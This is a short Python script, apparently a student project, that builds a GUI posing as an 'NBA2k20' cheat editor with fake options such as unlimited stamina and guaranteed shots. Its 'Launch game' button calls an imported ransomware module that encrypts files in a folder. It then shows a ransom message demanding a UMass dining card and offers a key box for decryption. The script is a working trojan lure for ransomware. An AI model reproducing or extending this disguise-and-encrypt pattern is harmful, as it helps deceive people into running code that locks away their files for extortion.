# import the library
from appJar import gui
import ransomware

key = "test"
path = "D:\\test\\"
# handle button events
app = gui("NBA2k20 hacking tool", "800x900")
def press(button):
    if (button == "Launch game"):
        ransomware.encrypt_files(path, key)
        app.setImage("thumbnail", "hacked.gif")
        app.addButton("Decrypt", press)
        app.setLabel("title", "All you files have been encrypted!\n Buy me a UMass Dinning card or you lose your files!")

        app.addLabelEntry("Key")
    elif(button == "Decrypt"):
        pwd = app.getEntry("Key")
        ransomware.decrypt_files(path, pwd)

def createGUI():
    # create a GUI variable called app

    app.setBg("grey")
    app.setFont(18)

    # add image
    app.addImage("thumbnail", "game.png")
    # add & configure widgets - widgets get a name, to help referencing them later
    app.addLabel("title", "NBA2k20 gameplay editor")
    app.setLabelFg("title", "white")

    app.check("Max speed")
    app.check("Max vertical")
    app.check("Unlimited stamina")
    app.check("Green shot")
    app.check("100% shot success")
    app.check("No fatigue")
    app.check("Freeze shot clock")
    app.check("All scores count toward player")

    # link the buttons to the function called press
    app.addButtons(["Launch game"], press)


    # start the GUI
    app.go()

#if __name__ == "__main__":
createGUI()
